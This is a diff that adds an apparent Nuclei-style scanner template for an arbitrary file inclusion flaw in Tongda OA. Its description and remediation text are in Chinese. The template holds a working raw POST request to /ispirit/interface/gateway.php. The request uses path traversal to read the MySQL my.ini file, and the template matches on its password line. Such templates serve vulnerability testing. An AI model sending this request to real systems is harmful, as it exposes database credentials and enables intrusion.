@@ -1,0 +1,40 @@
+http:
+    - matchers:
+        - condition: and
+          part: header
+          type: word
+          words:
+            - text/html
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '[mysql]'
+            - password=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /ispirit/interface/gateway.php HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/x-www-form-urlencoded
+
+          json={"url":"/general/../../mysql5/my.ini"}
+id: Tongda-OA-FileInclude
+info:
+    author:
+        - l0ne1y
+    description: |-
+        通达OA任意文件包含
+        开发人员为了使代码更灵活，会将被包含的文件设置为变量，用来进行动态调用，从而导致客户端可以恶意调用一个恶意文件，造成文件包含漏洞�?
+    name: 通达OA任意文件包含
+    reference:
+        - https://github.com/jas502n/oa-tongda-rce
+    remediation: |-
+        #### 官方修复方案�?
+        升级系统至无漏洞版本，或于官网下载安全补丁�?
+    severity: critical
+    tags:
+        - tongda
